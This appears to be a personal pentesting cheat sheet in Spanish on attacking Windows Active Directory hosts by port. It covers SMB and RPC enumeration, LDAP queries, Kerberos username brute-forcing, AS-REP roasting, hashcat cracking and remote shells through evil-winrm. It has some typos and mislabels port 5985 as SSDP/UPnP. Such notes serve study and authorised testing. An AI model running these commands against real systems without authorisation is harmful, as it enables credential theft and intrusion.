![[Pasted image 20230219172405.png]]

---

- ### Enumerar puerto 445 (default) ( #SMB ) 

```shell
crackmapexec smb {taget_ip}
# Obtener información de la maquina victima, esto puede devolvernos el nombre de la maquina, dominios, version de windows, etc (Dominios al /etc/hosts)
crackmapexec smb {target_ip0} --shares
# Intentar enumerar recursos compartidos a nivel de red
smbmap -H {target_ip} -u "null"
# Otra alternativa para intentar enumerar recursos compartidos a nivel de red y como no tenemos credenciales especificando -u "null" o no poniendo esto estamos intentando hacerlo con una null sesion.
smbclient -L {target_ip} -N
# Otra alternatica para de nuevo intentar enumerar recursos compartidos a nivel de red, -N (Null sesion)
```

- ### Puerto 135 (default) ( msrpc / #RPC )

```shell
rpcclient -U "" {target_ip} -N
# Si nos devuelve "rpcclient $>" podriamos intentar enumerar usuarios (enumdomusers) del DA para intentar realizar ataques como "AS-REP Roast" 
rpcclient -U "user%password" {target_ip} -N
# Esto con "rpcclient $> enumdomusers" devolveria por ejemplo algo como:
rpcclient $> enumdomusers
user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
# Devuelve a los usuarios junto a su rid
rpcclient $> enumdomgroups
group:[Domain Admins] rid:[0x200]
group:[Domain Users] rid:[0x201]
# Devuelve los grupos junto a su rid 
rpcclient $> querygroupmem {rid} 0x200
rid:[0x1f4] attr:[0x7]
# Esto devuelve todos los usuarios pertenecientes a dicho grupo
rpcclient $> queryuser {rid} 0x1f4
# Esto devuelve los datos del usuario consultado 
rpcclient $> querydispinfo
# Devuelve las descripciones de los grupos 
```

**Descripción:** Un ataque AS-REP Roast es un tipo de ataque de seguridad informático contra el protocolo Kerberos. Este ataque se acontece cuando uno de los Usuarios del Dominio tiene seteado el Atributo **UF_DONT_REQ_PREAUTH** lo que le permite solicitar un TGT a Kerberos (KDC) sin necesidad de proporcionar contraseña. En este mismo TGT se encuentra el Hash NTLMv2 del usuario en cuestion, que luego podriamos intentar crackear con fuerza bruta para obtener la contraseña del usuario.

- ### Puerto 389 (default) ( #LDAP ) 

```shell
ldapsearch -H "ldap://{target_ip}" -x -s base namingcontexts
# Enumerar servicio ldap, en este caso, namingcontexts
ldapsearch -H "ldap://{target_ip}" -x -b {naming_context}
# Enuimerar el servicio ldap
#################################################################################
namp -n -sV --script "ldap* and not brute" -p 389 {target_ip}
# Manera alternatica de enumerar el servicio ldap

```

- ##### Más enumeración de LDAP con ldap search en 
##### https://book.hacktricks.xyz/network-services-pentesting/pentesting-ldap

- ### Puerto 88 (default) ( #KERBEROS )

###### Existen herramientas como kerbrute https://github.com/ropnop/kerbrute las cuales nos permiten hacer fuerza bruta hacia kerberos 
- ##### Flujo de interno de #Kerberos [[Kerberos_Authentication_Flow.canvas]]

##### Esto siempre puede ser enlazado con las enumeraciones anteriores, por ejemplo si al enumerar el #ldap vemos que se enumera un namingcontext que puede ser de un usuario como "Owen Bonoris" podriamos pensar de que este sea un usuario valido y comenzar a ingresar combinaciones posibles como usuario:

- owen.bonoris
- owenb
- bowen
- bonoris.o
- obonoris
- o.bonoris
- owen.b
- b.owen

##### etc.  Estas convinaciones podrian ser guardadas en un archivo, por ejemplo users.txt y de esta menera haciendo uso de kerbrute realizar fuerza burta

```shell
kerbrute userenum --dc {target_ip} -d {domain_name} users.txt
# Fuerza bruta al domain de nuestra maquina victima intentando enumerar usuarios validos de ldomain en base a una wordlists de usuarios
impacket-GetNPUsers {domain_name}/ -no-pass -usersfile users.txt
# Esto es para con unos ciertos usuarios probar conseguir el hash NetNTLMv2 pero tambien podria ser usado para fuerza bruta ya que devolveria en caso de conseguir un usuario existente un output diferente.
# Si el usuario no exsite [-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database), si el usuario existe [-] User hsmith doesn't have UF_DONT_REQUIRE_PREAUTH set

```

##### Una vez que tuvieramos usuarios tambien podriamos pensar en un *AS-REP Roast Attack*  pero como kerbrute ya lo hace de manera interna, si no vemos en el output un hash quiere decir que el usuario no tiene configurado el *UF_DONT_REQUIRE_PREAUTH*, por lo que no podemos obtener el hash NetNTLMv2.

##### En caso de tener un hash, podriamos usar la herramienta "hashcat" para intentar romper el hash, para esto es importante saber el modo del hash al que nos enfrentamos, por ejemplo, si el hash que capturaramos fuede `$krb5asrep$23$user@domain.com:378sh129fsdf8sdf7...`  podriamos buscar con el comando hashcat --example-hashes y filtradon por el "krb5asrep" (`hashcat --example-hashes | grep -B 11 "krb5asrep"`) para poder conseguir asi el modo que sera utilizado posteriormente con la herramienta "hashcat"
#### `hashcat -m {hash_mode} -a {attack_mode} hash rockyou.txt`
##### Para obtener el hash mode, `hashcat --example-hashes` 

###### En caso de lograr crackear el hash NetNTLMv2, indicaria que podriamos tener credenciales validas, esto lo podemos corroborar con la herramienta "crackmapexec": 
##### (`crackmapexec smb {target_ip} -u {username} -p {password}`)
##### De esta manera, en caso de obtener un "[+]" indicaria de que las mismas son validas, aunque para poder obtener una shell interactiva buscamos que al usuario le aparezca un "Pwn3d!" para poder usar xexec y intentar ganar acceso al sistema, en caso de que no, podriamos en caso de tener el puerto 5985 ( #SSDP / #UPnP) (Servicio de administración remota de windows)
##### De manera que podriamos verificar si el usuario en cuestion pertenece al grupo "Remote Managment Users" los cuales pueden conectarse de manera remota:
##### (`crackmapexec winrm {target_ip} -u {username} -p {password}`)
##### En caso de obtener el glorioso "Pwn3d!", podriamos con herramientas como "evil-winrm",  entablar una consola remota.
##### `evil-winrm -i {target_ip} -u {username} -p {password}`

- ### Puerto 53 (default) ( #Domain )

##### Podriamos emitirs solicitudes DNS para ver si podemos aplicar un DNS zone transfer (AXFR) con la herramienta dig

```shell
dig @{target_ip} {domain_name} ns
# Emitir solicitudes para enumerar Name Servers
dig @{target_ip} {domain_name} mx 
# Emitir solicitudes para enumerar servidores de correo
dig @{target_ip} {domain_name} axfr
# Probar un DNS Zone Trasfer
```

- ### Puerto 5985 (default)

##### Puerto que suele correr el Servicio de administración remota de windows, el cual al estar activo, podria permitirnos posteriormente intentar con utilidades como crackmapexec, ver si un usuario con credenciales pertenece al grupo "Rmote Managament Users".